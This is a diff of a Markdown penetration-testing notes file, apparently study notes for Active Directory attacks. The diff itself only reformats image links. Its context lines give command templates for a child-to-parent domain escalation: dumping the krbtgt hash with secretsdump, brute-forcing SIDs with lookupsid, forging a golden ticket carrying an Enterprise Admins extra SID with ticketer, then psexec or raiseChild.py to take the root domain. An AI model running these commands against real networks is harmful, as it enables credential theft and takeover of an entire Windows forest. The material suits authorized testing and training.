@@ -13,20 +13,20 @@ secretsdump.py <CHILD_DOMAIN>/<user>@<IP> -just-dc-user <CHILD_DOMAIN>/krbtgt
     
     - LOGISTICS/krbtgt
     
-![[/image 354.png|image 354.png]]
+![image 354.png](/image%20354.png)
   
 # Performing SID Brute Forcing with Lookupsid.py
 if you only want domain SIDs, grep with “Domain SID”
 ```JavaScript
 lookupsid.py <CHILD_DOMAIN>/<user>@<IP> | grep "Domain SID"
 ```
-![[/image 1 262.png|image 1 262.png]]
+![image 1 262.png](/image%201%20262.png)
   
 # Grabbing the Domain SID & Attaching to Enterprise Admin’s RID
 ```JavaScript
 lookupsid.py <CHILD_DOMAIN>/<user>@<root_DC_IP> | grep -B12 "Enterprise Admins"
 ```
-![[/image 2 225.png|image 2 225.png]]
+![image 2 225.png](/image%202%20225.png)
 - RID of Enterprise Admins is 519 - attach this to root Domain SID to get Enterprise Admin SID
     
     - Domain SID is at top of the output
@@ -39,7 +39,7 @@ lookupsid.py <CHILD_DOMAIN>/<user>@<root_DC_IP> | grep -B12 "Enterprise Admins"
 ```JavaScript
 ticketer.py -nthash <KRBTGT_hash> -domain <CHILD_DOMAIN> -domain-sid <child_SID> -extra-sid <enterprise_admin_sid> hacker
 ```
-![[/image 3 195.png|image 3 195.png]]
+![image 3 195.png](/image%203%20195.png)
 - saves golden ticket to ccache file
   
 Set KRB5CCNAME using new ccache file
@@ -60,5 +60,5 @@ psexec.py <CHILD_DOMAIN>/hacker@<parent_dc_name>.<root_domain> -k -no-pass -targ
 ```JavaScript
 raiseChild.py -target-exec <root_DC_IP> <CHILD_DOMAIN>/<admin_user>
 ```
-![[/image 4 171.png|image 4 171.png]]
+![image 4 171.png](/image%204%20171.png)
 - if psexec doesn’t work, doing [raiseChild.py](http://raiseChild.py) will give you the Administrator’s hash anyways
